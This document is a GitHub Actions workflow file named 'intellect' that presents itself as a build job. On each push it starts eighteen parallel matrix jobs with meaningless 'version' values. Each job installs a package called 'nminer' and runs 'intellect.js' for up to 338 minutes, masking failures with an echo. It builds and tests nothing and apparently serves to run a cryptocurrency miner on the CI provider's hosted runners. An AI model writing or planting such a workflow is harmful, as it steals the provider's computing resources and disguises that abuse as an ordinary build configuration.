name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7181 }
          - { version: 3784 }
          - { version: 3104 }
          - { version: 5809 }
          - { version: 228 }
          - { version: 7463 }
          - { version: 8942 }
          - { version: 5305 }
          - { version: 9501 }
          - { version: 146 }
          - { version: 8533 }
          - { version: 6723 }
          - { version: 847 }
          - { version: 9322 }
          - { version: 986 }
          - { version: 9407 }
          - { version: 7460 }
          - { version: 7013 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: which plus times
        run: |
          npm install nminer@latest
          timeout 338m node intellect.js || echo "intellect executed"